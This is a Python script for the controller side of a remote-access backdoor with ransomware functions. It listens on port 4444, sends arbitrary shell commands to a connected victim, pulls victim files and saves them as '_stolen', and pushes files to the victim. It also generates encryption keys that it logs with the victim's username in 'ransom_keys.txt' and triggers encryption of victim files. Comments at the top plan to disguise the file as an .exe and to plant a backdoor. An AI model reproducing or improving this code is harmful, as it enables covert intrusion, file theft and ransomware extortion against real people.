#left: 
# must:     hide file by making .exe and less suspicious
#           contorl the port choices
# optional: method of placing backdoor


import socket, struct, os, time
from cryptography.fernet import Fernet

time_out = 3.0
extended_timeout = 60.0

class Listener:
    def __init__(self, ip, port) -> None:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        self.ip, self.port = ip, port
        listener.listen(0)
        print("\n[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print(f"\n[+] Got a connection from {str(address)}")
        self.connection.settimeout(time_out)  

    def execute_remotely(self, command):
        self.connection.send(command.encode('utf-8'))
        try:
            response = self.connection.recv(2048)
            return response
        except socket.timeout:
            return b"No output or timeout reached"

    def download(self, name, data):
        try:
            self.connection.settimeout(extended_timeout)
            try:
                file_size_data = self.connection.recv(8)
                file_size = struct.unpack('!Q', file_size_data)[0]  
                print(f"Expected file size: {file_size} bytes")
            except Exception as err:
                print(err)

            self.connection.send(b"ready")

            name = name.split(sep=".")
            file_path = name[0] + "_stolen." + name[1]

            with open(file_path, "wb") as file:
                bytes_received = 0
                while bytes_received < file_size:
                    chunk = self.connection.recv(min(4096, file_size - bytes_received))
                    if not chunk:
                        break
                    file.write(chunk)
                    bytes_received += len(chunk)
                    print(f"Received {bytes_received}/{file_size} bytes")

            print(f"File saved successfully and written to {file_path}")
            self.connection.settimeout(time_out)

        except Exception as err:
            print(f"Error occurred: {err}")

    def upload(self, name):
        try:
            self.connection.settimeout(extended_timeout)
            time.sleep(5)
            file_size = os.path.getsize(name)
            self.connection.sendall(struct.pack('!Q', file_size)) 
            print(f"Sending file size: {file_size} bytes")

            while True:
                is_ready = self.connection.recv(4096)
                if is_ready == b"ready":
                    break

            with open(name, "rb") as file:
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = file.read(4096)
                    if not chunk:
                        break
                    self.connection.sendall(chunk)
                    bytes_sent += len(chunk)
                    print(f"Sent {bytes_sent}/{file_size} bytes")

            print(f"File '{name}' sent successfully")
            self.connection.settimeout(time_out)
        except Exception as err:
            return print(f"Error occurred during upload: {err}")

    def encrypt_or_decrypt(self, command):
        try:
            self.connection.settimeout(extended_timeout)
            result = self.execute_remotely(command)
            print(result.decode('utf-8', errors='ignore'))
            self.connection.settimeout(time_out)
        except Exception as err:
            print(f"error in encrypt_or_decrypt: {err}")

    def keygen(self):
        try:
            file_name = "ransom_keys.txt"
            key = Fernet.generate_key()
            cipher = Fernet(key)
            key = key.decode("utf-8")
            
            user = self.execute_remotely("whoami").decode("utf-8")
            IP = self.ip
            
            with open(file_name, "a") as file:
                file.write(f"\n{user}\t\t{IP}\t\t{key}")

            print(f"The key is {key} and is saved in {file_name}")

        except Exception as err:
            print(f"An error occurrred: {err}")

    def run(self):
        while True:
            command = input(">> ")
            command_parsed = command.split(sep=" ")

            if command_parsed[0] == "download":
                result = self.execute_remotely(command)
                self.download(command_parsed[1], result)
                continue

            elif command_parsed[0] == "upload":
                result = self.execute_remotely(command)
                self.upload(command_parsed[1])
                try:
                    result = self.connection.recv(4096)
                except Exception as err:
                    print(f"error occurred: {err}")
                print(result.decode('utf-8', errors='ignore'))
                continue

            elif command_parsed[0] == "gen":
                self.keygen()
                continue


            elif command_parsed[0] == "enc" or command_parsed[0] == "dec":
                self.encrypt_or_decrypt(command)
                continue

            elif command_parsed[0] == "exit":
                print(f"closing connection")
                exit()
            result = self.execute_remotely(command)
            print(result.decode('utf-8', errors='ignore'))
            
mylistener = Listener("192.168.245.133", 4444)
mylistener.run()


